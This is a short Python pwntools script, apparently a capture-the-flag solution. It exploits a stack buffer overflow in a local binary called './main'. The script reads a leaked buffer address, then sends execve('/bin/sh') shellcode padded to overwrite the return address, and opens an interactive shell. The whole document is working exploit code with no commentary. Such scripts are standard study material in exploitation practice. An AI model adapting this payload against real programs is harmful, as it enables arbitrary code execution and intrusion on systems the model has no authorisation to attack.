from pwn import *

p = process('./main')
context.arch = 'amd64'

shellcode = asm("""
	xor rax, rax
	push rax
	mov rax, 0x68732f6e69622f
	push rax

	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 59
	syscall

""")

p.recvuntil(b'-> ')
buf = int(p.recvn(14), 16)
print(hex(buf))
payload = shellcode.ljust(0x68, b'A')
payload += p64(buf)

pause()
p.sendafter(b'> ', payload)


p.interactive()
